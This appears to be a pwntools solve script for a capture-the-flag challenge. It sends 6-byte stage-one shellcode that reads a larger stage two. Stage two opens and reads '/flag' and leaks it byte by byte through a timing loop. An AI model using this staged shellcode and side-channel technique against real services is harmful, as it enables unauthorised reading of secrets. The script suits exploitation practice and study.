#!/usr/bin/env python3

# type: ignore
# flake8: noqa

import string
import sys

from pwn import *

elf = context.binary = ELF("./chall")


def start(argv=[], *a, **kw):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port, timeout=10)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}

stage1 = asm("""\
xor rax, rax
push rdx
pop rsi
push rax
pop rdi
syscall
""")

if len(stage1) > 6:
    log.info("Too long")
    quit()

io = start()
io.sendafter(
    b"You've got 6 bytes, make them count!\n======================================\n",
    stage1)

stage2 = asm(f"""\
    .rept 6
    nop
    .endr
    push 0x616c662f
    mov rdi, rsp
    mov byte ptr [rsp+0x4], 0x67
    xor rsi, rsi
    mov rax, 2
    syscall

    mov rdi, rax
    sub rsp, 0x40
    mov qword ptr [rsp+0x38], 0
    mov qword ptr [rsp+0x30], 0
    mov qword ptr [rsp+0x28], 0
    mov qword ptr [rsp+0x20], 0
    mov qword ptr [rsp+0x18], 0
    mov qword ptr [rsp+0x10], 0
    mov qword ptr [rsp+0x8], 0
    mov qword ptr [rsp+0x0], 0
    mov rsi, rsp
    mov rdx, 0x40
    xor rax, rax
    syscall

    xor rax, rax
    mov al, byte ptr [rsp + {sys.argv[1]}]
    cmp rax, {sys.argv[2]}
    jne quit
loop:
    jmp loop
quit:
""")

pause(1)
io.send(stage2)

io.interactive()
